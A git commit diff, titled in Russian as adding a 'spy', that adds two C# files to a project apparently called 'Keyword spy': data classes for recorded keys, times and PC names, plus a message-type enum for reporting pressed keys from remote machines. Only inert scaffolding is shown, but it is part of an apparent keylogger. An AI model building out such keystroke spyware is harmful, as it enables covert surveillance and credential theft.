a4fb3b311266d74670b267fb5ff903d13d4b5eb7
LevLash <74620850+LevLash@users.noreply.github.com>
2020-11-19 19:56:24 +0200

    Добавил шпиёна

---
+++ Keyword spy/KeyServer/KeyClass.cs
@@ -0,0 +1,30 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace KeyServer
+{
+    public class KeyClass
+    {
+        public int Id { get; set; }
+        public string Key { get; set; }
+        public string Time { get; set; }
+        public string PC { get; set; }
+
+        public KeyClass(int id, string key, string time, string pc)
+        {
+            Id = id;
+            Key = key;
+            Time = time;
+            PC = pc;
+        }
+    }
+
+    public class PC_Class
+    {
+        public string PC { get; set; }
+        public string status { get; set; }
+    }
+}
---
+++ Keyword spy/KeyServer/SendPackage.cs
@@ -0,0 +1,18 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace KeyServer
+{
+    enum PackageType
+    {
+        On,
+        Pressed,
+        Off,
+    }
+    //On;PC name
+    //Pressed;key code;current date time;PC name
+    //Off;PC name
+}
